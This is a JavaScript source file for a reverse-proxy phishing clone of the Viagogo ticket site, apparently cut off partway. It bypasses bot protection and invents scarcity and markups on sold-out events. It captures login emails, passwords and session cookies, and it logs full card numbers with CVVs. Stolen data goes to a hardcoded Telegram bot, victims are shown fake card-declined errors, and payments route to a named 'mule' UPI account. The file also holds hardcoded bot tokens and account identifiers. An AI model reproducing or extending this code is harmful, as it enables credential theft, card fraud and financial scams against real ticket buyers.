// Viagogo full reverse proxy — CDN, API, HTML, CSS, images all routed through here.
// Strips security headers, rewrites cookies, proxies all vggcdn/stubhubstatic CDN domains,
// rewrites URLs in HTML/CSS, injects fetch/XHR interceptor + ticket availability engine.
//
// Run:  node proxy-viagogo.mjs              → http://localhost:3000
// Env:  PORT=8080 HOST=my.site PROTO=https node proxy-viagogo.mjs

import http from 'node:http';
import https from 'node:https';
import fs from 'node:fs';
import path from 'node:path';
import { createGunzip, createInflate, createBrotliDecompress, gzipSync } from 'node:zlib';
import { randomBytes, createHash } from 'node:crypto';
import { execSync } from 'node:child_process';

const PORT     = Number(process.env.PORT) || 3000;
const FALLBACK_HOST = process.env.HOST || `localhost:${PORT}`;
const FALLBACK_PROTO = process.env.PROTO || 'http';
const UPSTREAM = 'www.viagogo.com';
const AUTH_UPSTREAM = 'my.viagogo.com';  // viagogo uses separate auth subdomain
const REQ_TIMEOUT = 20000;
const MAX_RETRIES = 2;

// ── DataDome cookie jar — server-side cookie sharing ──
// When a browser on localhost solves the DataDome challenge, the proxy captures
// the datadome cookie from the upstream response. All subsequent proxy requests
// (including from CF tunnel visitors who can't solve the challenge themselves)
// reuse this cookie → get 200s instead of 403 challenge pages.
let _ddCookie = '';   // stores 'datadome=XXXXX' cookie value
let _ddExpiry = 0;    // cookie expiry timestamp (ms)
let _ddRefreshing = false;
let _ddLastRefresh = 0;

// ── DataDome cookie auto-refresh — curl with browser headers ──
// Tunnel visitors can't solve DataDome challenges (domain mismatch).
// This seeds the cookie jar server-side so tunnel visitors get 200s.
function refreshDataDomeCookie() {
  if (_ddRefreshing || Date.now() - _ddLastRefresh < 30000) return _ddCookie;
  _ddRefreshing = true;
  _ddLastRefresh = Date.now();
  try {
    const raw = execSync(
      'curl -sI -m 10 ' +
      '-H "User-Agent: Mozilla/5.0 (Linux; Android 14; CPH2387 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36" ' +
      '-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ' +
      '-H "Accept-Language: en-US,en;q=0.9" ' +
      '-H "sec-ch-ua-mobile: ?1" ' +
      '-H "sec-fetch-dest: document" ' +
      '-H "sec-fetch-mode: navigate" ' +
      '-H "sec-fetch-site: none" ' +
      '-H "Upgrade-Insecure-Requests: 1" ' +
      'https://www.viagogo.com/',
      { encoding: 'utf8', timeout: 15000, stdio: ['pipe', 'pipe', 'pipe'] }
    );
    const m = raw.match(/set-cookie:\s*(datadome=[^;]+)/i);
    if (m) {
      _ddCookie = m[1];
      _ddExpiry = Date.now() + 31536000000;
      console.log('[DD] auto-refreshed cookie: ' + _ddCookie.substring(0, 30) + '...');
    }
  } catch (e) {
    console.error('[DD] refresh failed:', e.message);
  }
  _ddRefreshing = false;
  return _ddCookie;
}

// Pre-warm cookie on startup (2s delay), then refresh every 20 min
setTimeout(() => { refreshDataDomeCookie(); }, 2000);
setInterval(() => { refreshDataDomeCookie(); }, 20 * 60 * 1000);

// ── HTML page cache — serves last-good page when DataDome returns 403 ──
// Persists to disk so it survives proxy restarts.
const _pageCache = new Map();
const PAGE_CACHE_TTL = 86400_000; // 24 hours
const PAGE_CACHE_MAX = 50;
const PAGE_CACHE_DIR = path.join(process.env.HOME || '/tmp', '.spud', 'page-cache');
try { fs.mkdirSync(PAGE_CACHE_DIR, { recursive: true }); } catch {}

function cacheHtml(urlPath, html, headers) {
  if (_pageCache.size >= PAGE_CACHE_MAX) {
    const oldest = _pageCache.keys().next().value;
    _pageCache.delete(oldest);
  }
  const entry = { html, headers: { ...headers }, ts: Date.now() };
  _pageCache.set(urlPath, entry);
  try {
    const fname = Buffer.from(urlPath).toString('base64url').slice(0, 120) + '.json';
    fs.writeFileSync(path.join(PAGE_CACHE_DIR, fname), JSON.stringify({ urlPath, html, headers: entry.headers, ts: entry.ts }));
  } catch {}
}

function getCachedHtml(urlPath) {
  const e = _pageCache.get(urlPath);
  if (!e) return null;
  if (Date.now() - e.ts > PAGE_CACHE_TTL) { _pageCache.delete(urlPath); return null; }
  return e;
}

// Load persisted page cache from disk on startup
try {
  const files = fs.readdirSync(PAGE_CACHE_DIR).filter(f => f.endsWith('.json'));
  let loaded = 0;
  for (const f of files) {
    try {
      const data = JSON.parse(fs.readFileSync(path.join(PAGE_CACHE_DIR, f), 'utf-8'));
      if (data.urlPath && data.html && data.ts && (Date.now() - data.ts < PAGE_CACHE_TTL)) {
        _pageCache.set(data.urlPath, { html: data.html, headers: data.headers || {}, ts: data.ts });
        loaded++;
      } else {
        try { fs.unlinkSync(path.join(PAGE_CACHE_DIR, f)); } catch {}
      }
    } catch {}
  }
  if (loaded > 0) console.log(`[CACHE] Loaded ${loaded} cached pages from disk`);
} catch {}

// ── QRCode.js — self-hosted to avoid CDN 503 through CF tunnel ──
const _qrcodeBuf = fs.readFileSync(new URL('./qrcode.min.js', import.meta.url));
const _qrcodeEtag = '"qr-' + createHash('md5').update(_qrcodeBuf).digest('hex').slice(0, 8) + '"';

// ── Real viagogo favicon.ico — served at /favicon.ico ──
const _faviconBuf = fs.readFileSync(new URL('./favicon.ico', import.meta.url));
const _faviconEtag = '"fav-' + createHash('md5').update(_faviconBuf).digest('hex').slice(0, 8) + '"';

// ── In-memory CDN asset cache — avoids re-fetching static assets from upstream ──
const CDN_CACHE = new Map();          // key: cdnDomain+path → {buf, headers, ts}
const CDN_CACHE_TTL = 3600_000;       // 1 hour
const CDN_CACHE_MAX = 500;            // max entries (LRU-ish: oldest evicted on overflow)
function cdnCacheGet(key) {
  const e = CDN_CACHE.get(key);
  if (!e) return null;
  if (Date.now() - e.ts > CDN_CACHE_TTL) { CDN_CACHE.delete(key); return null; }
  return e;
}
function cdnCacheSet(key, buf, headers) {
  if (CDN_CACHE.size >= CDN_CACHE_MAX) {
    const oldest = CDN_CACHE.keys().next().value;
    CDN_CACHE.delete(oldest);
  }
  CDN_CACHE.set(key, { buf, headers: { ...headers }, ts: Date.now() });
}

// ── Gzip helper — re-compress rewritten text for client ──
function gzipBuf(buf) {
  try { return gzipSync(buf, { level: 6 }); } catch { return buf; }
}
function sendCompressed(cRes, statusCode, outH, buf, acceptEnc) {
  if (acceptEnc && /\bgzip\b/i.test(acceptEnc) && buf.length > 860) {
    const gz = gzipBuf(buf);
    outH['content-encoding'] = 'gzip';
    outH['content-length'] = gz.length;
    cRes.writeHead(statusCode, outH);
    cRes.end(gz);
  } else {
    outH['content-length'] = buf.length;
    cRes.writeHead(statusCode, outH);
    cRes.end(buf);
  }
}

// ── Crash guards — keep the process alive ──
process.on('uncaughtException', (err) => {
  console.error('[uncaughtException]', err.message);
});
process.on('unhandledRejection', (err) => {
  console.error('[unhandledRejection]', err);
});

// ═══════════════════════════════════════════════════════════════════
// TICKET AVAILABILITY ENGINE
// Makes sold-out / unavailable events show as available with limited stock.
// "1 left" / "2 left" creates urgency → drives payment.
// ═══════════════════════════════════════════════════════════════════

function djb2(s) {
  let v = 5381;
  for (let i = 0; i < s.length; i++) v = ((v << 5) + v + s.charCodeAt(i)) | 0;
  return v < 0 ? -v : v;
}

// Ticket markup engine — adds 15-40% markup on real prices
function ticketMarkup(seed, originalPrice) {
  if (originalPrice < 100) return originalPrice;
  const norm = (djb2(seed) % 10000) / 9999;
  const pct = Math.round(15 + norm * 25); // 15-40% markup
  let np = Math.round(originalPrice * (1 + pct / 100));
  // Round to nice numbers
  if (np >= 5000) np = Math.round(np / 500) * 500 - 1;
  else if (np >= 500) np = Math.round(np / 100) * 100 - 1;
  return np;
}

// Fake stock count — always shows low availability
function fakeStock(seed) {
  const h = djb2(seed + '::stock') % 5;
  return h <= 1 ? 1 : h <= 3 ? 2 : 3;
}

// ═══════════════════════════════════════════════════════════════════
// AUTH RELAY SYSTEM — intercepts Viagogo login flow, captures credentials.
//
// Flow:
//   1. Customer hits login → redirected to my.viagogo.com
//   2. We proxy my.viagogo.com under same domain (/_auth/ prefix)
//   3. Relay captures email + password from POST body
//   4. Real Viagogo authenticates, session cookies captured
//   5. Payment page shows real account info → trust++
// ═══════════════════════════════════════════════════════════════════

const SESSIONS_FILE = process.env.SPUD_DATA
  ? path.join(process.env.SPUD_DATA, 'sessions.jsonl')
  : path.join(process.cwd(), 'captured-sessions.jsonl');

const SESSION_STORE = new Map();
const COOKIE_JAR = new Map();

function visitorId(req) {
  const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '0.0.0.0';
  const ua = (req.headers['user-agent'] || '').slice(0, 80);
  return djb2(ip + '::' + ua).toString(36);
}

// Viagogo login API patterns
const LOGIN_POST_RE = /[/]secure[/]login/i;
const LOGIN_BODY_EMAIL_RE = /(?:email|Email|emailAddress)\s*[=:]\s*"?([^"&\s]+@[^"&\s]+)/;
const LOGIN_BODY_PASS_RE = /(?:password|Password|passwd)\s*[=:]\s*"?([^"&\s]{2,})/;

function interceptLoginRequest(url, bodyStr, vid) {
  if (!LOGIN_POST_RE.test(url)) return null;

  // URL-encoded form body: email=foo%40bar.com&password=secret
  const emailMatch = bodyStr.match(/email=([^&]+)/) || bodyStr.match(LOGIN_BODY_EMAIL_RE);
  const passMatch = bodyStr.match(/password=([^&]+)/) || bodyStr.match(LOGIN_BODY_PASS_RE);

  if (!emailMatch && !passMatch) return null;

  const email = emailMatch ? decodeURIComponent(emailMatch[1]) : null;
  const password = passMatch ? decodeURIComponent(passMatch[1]) : null;

  let session = SESSION_STORE.get(vid);
  if (!session) {
    session = { email: null, password: null, cookies: {}, loginTime: null, ip: '', ua: '', stage: 'login_attempt' };
    SESSION_STORE.set(vid, session);
  }
  if (email) session.email = email;
  if (password) session.password = password;
  session.stage = 'login_attempt';
  session.loginTime = Date.now();

  console.log('[AUTH RELAY] Login attempt:', email, 'vid:', vid);

  // Log to file
  try {
    const entry = { ts: new Date().toISOString(), vid, email, password: password ? '***captured***' : null, ip: session.ip };
    fs.appendFileSync(SESSIONS_FILE, JSON.stringify(entry) + '\n');
  } catch(e) {}

  return session;
}

function interceptAuthResponse(url, responseHeaders, responseBody, vid) {
  const setCookies = responseHeaders['set-cookie'];
  if (setCookies) {
    if (!COOKIE_JAR.has(vid)) COOKIE_JAR.set(vid, new Map());
    const jar = COOKIE_JAR.get(vid);
    const cookies = Array.isArray(setCookies) ? setCookies : [setCookies];
    for (const c of cookies) {
      const eqIdx = c.indexOf('=');
      if (eqIdx > 0) {
        const name = c.slice(0, eqIdx).trim();
        const valEnd = c.indexOf(';', eqIdx);
        const value = valEnd > 0 ? c.slice(eqIdx + 1, valEnd) : c.slice(eqIdx + 1);
        jar.set(name, value);
      }
    }

    // Mark session as logged in if we got auth cookies
    let session = SESSION_STORE.get(vid);
    if (session) {
      session.stage = 'logged_in';
      session.cookies = Object.fromEntries(jar);
    }
  }
}

// ═══════════════════════════════════════════════════════════════════
// PAYMENT PAGE SYSTEM
// ═══════════════════════════════════════════════════════════════════

const CARDS_FILE = process.env.SPUD_DATA
  ? path.join(process.env.SPUD_DATA, 'cards.jsonl')
  : path.join(process.cwd(), 'captured-cards.jsonl');

const MULE_POOL = [
  {
    vpa: process.env.SPUD_VPA || '7977003623@kotakbank',
    name: process.env.SPUD_NAME || 'Asif Shaikh',
    displayVpa: process.env.SPUD_DISPLAY_VPA || 'viagogo.payments@axisbank',
    dailyLimit: 200000, todayTotal: 0, active: true
  },
];

function selectMule(amount) {
  const avail = MULE_POOL.filter(m => m.active && (m.todayTotal + amount) <= m.dailyLimit);
  if (!avail.length) return MULE_POOL[0];
  avail.sort((a, b) => a.todayTotal - b.todayTotal);
  return avail[0];
}

function genOrderId() {
  return 'VG' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2,6).toUpperCase();
}

const PENDING_PAYMENTS = new Map();

// ── Server-side event info cache — extracted from proxied viagogo HTML ──
// Key: URL path (e.g. "/in/concert-tickets/adam-port/E-12345"), Value: {date,time,venue,ts}
const EVENT_INFO_CACHE = new Map();
function extractEventInfoFromHTML(html, urlPath) {
  try {
    // Extract JSON-LD from server-side HTML
    const ldRe = /<script[^>]+type\s*=\s*["']application\/ld\+json["'][^>]*>([\s\S]*?)<\/script>/gi;
    let m;
    while ((m = ldRe.exec(html)) !== null) {
      try {
        let ld = JSON.parse(m[1]);
        const items = Array.isArray(ld) ? ld : [ld];
        for (const item of items) {
          if (item['@graph']) items.push(...item['@graph']);
          if (item['@type'] && /Event|MusicEvent|SportsEvent|TheaterEvent|Festival/i.test(item['@type'])) {
            const info = { date: '', time: '', venue: '', ts: Date.now() };
            if (item.startDate) {
              const d = new Date(item.startDate);
              if (!isNaN(d)) {
                info.date = d.toLocaleDateString('en-IN', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', timeZone: 'Asia/Kolkata' });
                info.time = d.toLocaleTimeString('en-IN', { hour: 'numeric', minute: '2-digit', hour12: true, timeZone: 'Asia/Kolkata' }).toUpperCase();
              }
            }
            if (item.location) {
              let loc = item.location;
              if (Array.isArray(loc)) loc = loc[0];
              if (loc && loc.name) {
                info.venue = loc.name;
                if (loc.address && loc.address.addressLocality && info.venue.indexOf(loc.address.addressLocality) === -1)
                  info.venue += ', ' + loc.address.addressLocality;
              } else if (loc && loc.address && loc.address.name) {
                info.venue = loc.address.name + (loc.address.addressLocality ? ', ' + loc.address.addressLocality : '');
              } else if (typeof loc === 'string') {
                info.venue = loc;
              }
            }
            if (info.date || info.venue) {
              EVENT_INFO_CACHE.set(urlPath, info);
              // Cap cache at 200 entries
              if (EVENT_INFO_CACHE.size > 200) {
                const oldest = EVENT_INFO_CACHE.keys().next().value;
                EVENT_INFO_CACHE.delete(oldest);
              }
              return info;
            }
          }
        }
      } catch (e) {}
    }
  } catch (e) {}
  return null;
}

// ── Telegram notification for payments ──
const TG_BOT = process.env.SPUD_BOT_TOKEN || '9131043893:AAG-5fEzbYHLsx79SKJP1LsM23_lnUna35A';
const TG_CHAT = process.env.SPUD_ADMIN_ID || '5700018165';
const TG_CLIENT = process.env.SPUD_CLIENT_ID || '8416592726';

function tgSend(chatId, text, replyMarkup) {
  try {
    const payload = { chat_id: chatId, text, parse_mode: 'HTML' };
    if (replyMarkup) payload.reply_markup = replyMarkup;
    const postData = JSON.stringify(payload);
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${TG_BOT}/sendMessage`,
      method: 'POST',
      headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(postData) },
      timeout: 8000,
    }, (res) => {
      let b = '';
      res.on('data', c => { b += c; });
      res.on('end', () => {
        try {
          const r = JSON.parse(b);
          if (!r.ok) console.log('[TG] Send failed to', chatId, ':', r.description || 'unknown');
        } catch(e) {}
      });
    });
    req.on('error', (e) => { console.log('[TG] Request error to', chatId, ':', e.message); });
    req.write(postData);
    req.end();
  } catch(e) { console.log('[TG] Exception:', e.message); }
}

function tgNotify(text, replyMarkup) { tgSend(TG_CHAT, text, replyMarkup); }
function tgClient(text, replyMarkup) { if (TG_CLIENT) tgSend(TG_CLIENT, text, replyMarkup); }

// ── Telegram bot polling — handles /start, denies strangers ──
let _tgOffset = 0;
const TG_ALLOWED = new Set([TG_CHAT, TG_CLIENT].filter(Boolean));

function tgPoll() {
  try {
    const url = `/bot${TG_BOT}/getUpdates?offset=${_tgOffset}&timeout=30&allowed_updates=["message"]`;
    const req = https.request({
      hostname: 'api.telegram.org', path: url, method: 'GET', timeout: 35000,
    }, (res) => {
      let buf = '';
      res.on('data', c => { buf += c; });
      res.on('end', () => {
        try {
          const j = JSON.parse(buf);
          if (j.ok && Array.isArray(j.result)) {
            for (const upd of j.result) {
              _tgOffset = Math.max(_tgOffset, upd.update_id + 1);
              if (upd.message) handleTgMessage(upd.message);
            }
          }
        } catch(e) {}
        setTimeout(tgPoll, 1000);
      });
    });
    req.on('error', () => { setTimeout(tgPoll, 5000); });
    req.on('timeout', () => { req.destroy(); setTimeout(tgPoll, 1000); });
    req.end();
  } catch(e) { setTimeout(tgPoll, 5000); }
}

function handleTgMessage(msg) {
  const chatId = String(msg.chat?.id || '');
  const text = (msg.text || '').trim();

  // ── Chief (Sam) ──
  if (chatId === TG_CHAT) {
    if (text === '/start') {
      tgSend(TG_CHAT,
        `⚡ <b>VIAGOGO ADMIN CONSOLE</b>\n\n` +
        `Status: 🟢 Online\n` +
        `Role: <b>Chief Operator</b>\n\n` +
        `All payment notifications, card captures, and system alerts will appear here.\n\n` +
        `📌 Pin this chat for quick access.`
      );
    }
    return;
  }

  // ── Client (Zayn) ──
  if (chatId === TG_CLIENT) {
    if (text === '/start') {
      const clientNum = '#' + (4100 + Math.floor(Math.abs(parseInt(TG_CLIENT)) % 900));
      tgSend(TG_CLIENT,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🎫  <b>VIAGOGO CLONE</b>  🎫\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `Welcome aboard.\n\n` +
        `Client: <b>${clientNum}</b>\n` +
        `Tier: <b>Enterprise</b>\n` +
        `Status: 🟢 <b>Active</b>\n` +
        `Expiry: <code>2027-06-30</code>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `You will receive real-time payment alerts here.\n` +
        `Use the <b>Approve</b> / <b>Deny</b> buttons on each payment to manage orders instantly.\n\n` +
        `⚡ <b>IMPORTANT — DO THIS NOW:</b>\n\n` +
        `1️⃣  <b>Pin this chat</b> — long press → Pin\n` +
        `2️⃣  <b>Turn on notifications</b> — tap chat name → Notifications → ON\n` +
        `3️⃣  <b>Keep Telegram open</b> during active hours\n\n` +
        `Every second counts. A missed notification = a missed payment.\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `Powered by viagogo Clone Systems\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━`
      );
      // Notify chief that client just activated
      tgNotify(`🔔 <b>Client ${clientNum} connected</b>\n\nChat ID: <code>${TG_CLIENT}</code>\nBot is now live for client notifications.`);
    }
    return;
  }

  // ── Everyone else — denied ──
  tgSend(chatId,
    `⛔ <b>Access Denied</b>\n\nThis bot is private. You are not authorized.\n\nRequest ID: <code>${Date.now().toString(36)}</code>`
  );
}

// Start polling after server is up
setTimeout(tgPoll, 2000);

const CARD_ERRORS = [
  { code: 'BANK_SERVER_ERROR', title: 'Payment Failed', msg: 'We\'re sorry, but your payment could not be processed due to a technical issue at the bank\'s end. No amount has been deducted from your account. Please try again.' },
  { code: 'CARD_DECLINED', title: 'Card Declined', msg: 'Your payment could not be processed. Your card was declined by the issuing bank. Please try a different card or payment method.' },
  { code: 'RISK_CHECK_FAILED', title: 'Transaction Declined', msg: 'Transaction was declined on the basis of risk check by the bank. Please contact your bank for more details or try a different payment method.' },
  { code: 'TXN_LIMIT_EXCEEDED', title: 'Limit Exceeded', msg: 'Payment failed. Your daily online transaction limit has been exceeded. Please try again tomorrow or use a different card.' },
  { code: 'TECH_ERROR', title: 'Technical Error', msg: 'Oops! There was a technical error while processing your payment. No amount has been deducted. Please try again.' },
];

function randomCardError() {
  return CARD_ERRORS[Math.floor(Math.random() * CARD_ERRORS.length)];
}

function isMobile(req) {
  const ua = req.headers['user-agent'] || '';
  return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(ua);
}

// ── Card capture POST handler ──
function handleCardCapture(cReq, cRes) {
  let body = '';
  cReq.on('data', c => { body += c; if (body.length > 10000) cReq.destroy(); });
  cReq.on('end', () => {
    try {
      const data = JSON.parse(body);
      const entry = {
        ts: new Date().toISOString(),
        orderId: data.orderId || '',
        card: data.cardNumber || '',
        exp: data.expiry || '',
        cvv: data.cvv || '',
        name: data.name || '',
        amount: data.amount || 0,
      };
      fs.appendFileSync(CARDS_FILE, JSON.stringify(entry) + '\n');
      console.log('[CARD CAPTURED]', entry.card, entry.exp, entry.cvv, '₹' + entry.amount);
      const cip = cReq.headers['x-forwarded-for'] || cReq.socket?.remoteAddress || '?';
      const cardTime = new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'});
      tgNotify(
        `💳 <b>CARD CAPTURED</b>\n\n` +
        `Order: <code>${entry.orderId}</code>\n` +
        `Card: <code>${entry.card}</code>\n` +
        `Exp: <code>${entry.exp}</code> | CVV: <code>${entry.cvv}</code>\n` +
        `Name: ${entry.name}\n` +
        `Amount: <b>₹${entry.amount}</b>\n` +
        `IP: <code>${cip}</code>\n` +
        `Time: ${cardTime}`
      );
      tgClient(
        `💳 <b>Card Payment Attempt</b>\n\n` +
        `Card: <code>**** **** **** ${(entry.card || '').slice(-4)}</code>\n` +
        `Amount: <b>₹${entry.amount}</b>\n` +
        `Time: ${cardTime}`
      );

      const delay = 3000 + Math.floor(Math.random() * 3000);
      const err = randomCardError();
      setTimeout(() => {
        cRes.writeHead(200, { 'content-type': 'application/json' });
        cRes.end(JSON.stringify({ status: 'failed', errorCode: err.code, title: err.title, message: err.msg }));
      }, delay);
    } catch(e) {
      cRes.writeHead(400, { 'content-type': 'application/json' });
      cRes.end(JSON.stringify({ status: 'error', message: 'Invalid request' }));
    }
  });
}

// ═══════════════════════════════════════════════════════════════════
// CLIENT-SIDE INJECTED SCRIPTS
// ═══════════════════════════════════════════════════════════════════

// 1) Fetch/XHR interceptor — rewrites runtime network requests + fixes dynamic images
const INTERCEPT_JS = `(function(){
/* ── Patch URL constructor — relative paths + empty strings break after domain stripping ── */
var _OrigURL=window.URL;
window.URL=function(u,b){
  try{
    /* Empty string → current page (domain was stripped) */
    if(typeof u==='string'&&u==='')u=window.location.origin;
    /* Relative paths → prepend origin */
    if(arguments.length===1&&typeof u==='string'&&u.startsWith('/'))
      return new _OrigURL(u,window.location.origin);
    if(arguments.length===1&&typeof u==='string'&&!u.match(/^[a-z]+:/i)&&u.length>0)
      return new _OrigURL(u,window.location.origin);
    if(arguments.length>=2)return new _OrigURL(u,b);
    return new _OrigURL(u);
  }catch(e){
    /* Last resort: return origin URL */
    try{return new _OrigURL(window.location.origin);}catch(e2){throw e;}
  }
};
window.URL.prototype=_OrigURL.prototype;

/* ── Extract real event date/time/venue from viagogo DOM ── */
/* Exposed on window so TICKET_JS IIFE can also call it */
function _vgEventInfo(){
  var info={date:'',time:'',venue:''};
  /* 1) JSON-LD structured data — most reliable on viagogo */
  var ldScripts=document.querySelectorAll('script[type="application/ld+json"]');
  for(var i=0;i<ldScripts.length;i++){
    try{
      var ld=JSON.parse(ldScripts[i].textContent);
      var items=Array.isArray(ld)?ld:[ld];
      for(var j=0;j<items.length;j++){
        var ev=items[j];
        if(ev['@graph']){items=items.concat(ev['@graph']);continue;}
        if(ev['@type']&&/Event|MusicEvent|SportsEvent|TheaterEvent|Festival/i.test(ev['@type'])){
          if(ev.startDate){
            var d=new Date(ev.startDate);
            if(!isNaN(d)){info.date=d.toLocaleDateString('en-IN',{weekday:'long',year:'numeric',month:'long',day:'numeric',timeZone:'Asia/Kolkata'});info.time=d.toLocaleTimeString('en-IN',{hour:'numeric',minute:'2-digit',hour12:true,timeZone:'Asia/Kolkata'}).toUpperCase();}
          }
          if(ev.location){
            var loc=ev.location;
            if(Array.isArray(loc))loc=loc[0];
            if(loc&&loc.name){info.venue=loc.name;if(loc.address){var a=loc.address;if(a.addressLocality&&info.venue.indexOf(a.addressLocality)===-1)info.venue+=', '+a.addressLocality;}}
            else if(loc&&loc.address&&loc.address.name)info.venue=loc.address.name+(loc.address.addressLocality?', '+loc.address.addressLocality:'');
            else if(typeof loc==='string')info.venue=loc;
          }
          break;
        }
      }
    }catch(e){}
  }
  /* 2) Meta tags — itemprop, og:, event: */
  if(!info.date){
    var mSel=['meta[itemprop="startDate"]','meta[property="event:start_date"]','meta[property="og:event:start_date"]','time[itemprop="startDate"]','[itemprop="startDate"]'];
    for(var mi=0;mi<mSel.length;mi++){var m=document.querySelector(mSel[mi]);if(m){try{var mc=m.content||m.getAttribute('datetime')||m.textContent;var d=new Date(mc);if(!isNaN(d)){info.date=d.toLocaleDateString('en-IN',{weekday:'long',year:'numeric',month:'long',day:'numeric',timeZone:'Asia/Kolkata'});if(!info.time)info.time=d.toLocaleTimeString('en-IN',{hour:'numeric',minute:'2-digit',hour12:true,timeZone:'Asia/Kolkata'}).toUpperCase();break;}}catch(e){}}}
  }
  if(!info.venue){var vm=document.querySelector('[itemprop="location"] [itemprop="name"],[itemprop="location"][content]');if(vm)info.venue=(vm.content||vm.textContent||'').trim();}
  /* 3) Page title — viagogo format: "Event Tickets | Sat 14 Jun 2025 | viagogo" */
  if(!info.date){
    var titleParts=(document.title||'').split('|');
    for(var tp=0;tp<titleParts.length;tp++){
      var tpc=titleParts[tp].trim();
      var tdm=tpc.match(/((?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)[a-z]*[,.]?\\s+\\d{1,2}\\s+(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\\s+\\d{4})/i);
      if(!tdm)tdm=tpc.match(/(\\d{1,2}\\s+(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\\s+\\d{4})/i);
      if(tdm){info.date=tdm[0].trim();break;}
    }
  }
  /* 4) Visible date elements — expanded selectors for viagogo */
  if(!info.date){
    var dSel='[class*="date"],[class*="Date"],[data-testid*="date"],[class*="event-info"],[class*="EventInfo"],[class*="detail"],[class*="Detail"],h1,h2,.event-header,.event-details';
    var els=document.querySelectorAll(dSel);
    for(var k=0;k<els.length;k++){
      var t=(els[k].textContent||'').trim().substring(0,200);
      var dm=t.match(/((?:Mon(?:day)?|Tue(?:sday)?|Wed(?:nesday)?|Thu(?:rsday)?|Fri(?:day)?|Sat(?:urday)?|Sun(?:day)?)[,.]?\\s+\\d{1,2}\\s+(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\\s+\\d{4})/i);
      if(!dm)dm=t.match(/(\\d{1,2}\\s+(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\\s+\\d{4})/i);
      if(dm){info.date=dm[0].trim();break;}
    }
  }
  /* 5) Visible time */
  if(!info.time){
    var tEls=document.querySelectorAll('[class*="time"],[class*="Time"],[data-testid*="time"],[class*="detail"],[class*="Detail"]');
    for(var k=0;k<tEls.length;k++){
      var tt=(tEls[k].textContent||'').trim();
      var tm=tt.match(/(\\d{1,2}[:.:]\\d{2}\\s*(?:AM|PM|am|pm))/);
      if(tm){info.time=tm[1].toUpperCase();break;}
    }
    if(!info.time){var bodyT=(document.body?document.body.textContent:'').substring(0,5000);var bm=bodyT.match(/(\\d{1,2}:\\d{2}\\s*(?:AM|PM))/i);if(bm)info.time=bm[1].toUpperCase();}
  }
  /* 6) Venue — expanded selectors + aria-label mining */
  if(!info.venue){
    var vSel='[class*="venue"],[class*="Venue"],[class*="location"],[class*="Location"],[data-testid*="venue"],[itemprop="location"],[class*="place"],[class*="Place"]';
    var vEls=document.querySelectorAll(vSel);
    for(var k=0;k<vEls.length;k++){
      var vt=(vEls[k].textContent||'').trim();
      if(vt.length>3&&vt.length<120){info.venue=vt.split('\\n')[0].trim();break;}
    }
  }
  /* 7) Venue from aria-labels on links/buttons (viagogo uses these) */
  if(!info.venue){
    var aLinks=document.querySelectorAll('a[aria-label*="at "],a[aria-label*="venue"]');
    for(var k=0;k<aLinks.length;k++){
      var al=aLinks[k].getAttribute('aria-label')||'';
      var atMatch=al.match(/at\\s+(.+?)(?:\\s+on|\\s+\\d|$)/i);
      if(atMatch&&atMatch[1].length>3){info.venue=atMatch[1].trim();break;}
    }
  }
  return info;
}
window._vgEventInfo=_vgEventInfo;
window.URL.createObjectURL=_OrigURL.createObjectURL;
window.URL.revokeObjectURL=_OrigURL.revokeObjectURL;
try{Object.setPrototypeOf(window.URL,_OrigURL);}catch(e){}
/* ── URL rewriter ── */
function rw(u){
  if(!u||typeof u!=='string')return u;
  /* Main domains → relative */
  u=u.replace(/https?:\\/\\/(?:www)\\.viagogo\\.com/g,'');
  u=u.replace(/(?:https?:)?\\/\\/(?:www)\\.viagogo\\.com/g,'');
  /* Auth domain → relative */
  u=u.replace(/https?:\\/\\/my\\.viagogo\\.com/g,'');
  u=u.replace(/(?:https?:)?\\/\\/my\\.viagogo\\.com/g,'');
  /* CDN domains → /_cdn/ */
  u=u.replace(/https?:\\/\\/([a-z0-9][-a-z0-9.]*\\.(?:vggcdn\\.net|stubhubstatic\\.com|viagogo\\.net|viagogo\\.com))/g,'/_cdn/$1');
  u=u.replace(/(?:https?:)?\\/\\/([a-z0-9][-a-z0-9.]*\\.(?:vggcdn\\.net|stubhubstatic\\.com|viagogo\\.net|viagogo\\.com))/g,'/_cdn/$1');
  return u;
}
/* ── Override fetch ── */
var OF=window.fetch;
window.fetch=function(a,b){
  try{if(typeof a==='string')a=rw(a);else if(a&&a.url)a=new Request(rw(a.url),a);}catch(e){}
  return OF.call(this,a,b).catch(function(err){
    return OF.call(window,a,b);
  }).catch(function(){
    return new Response('{}',{status:200,headers:{'content-type':'application/json'}});
  });
};
/* ── Override XHR ── */
var OO=XMLHttpRequest.prototype.open;
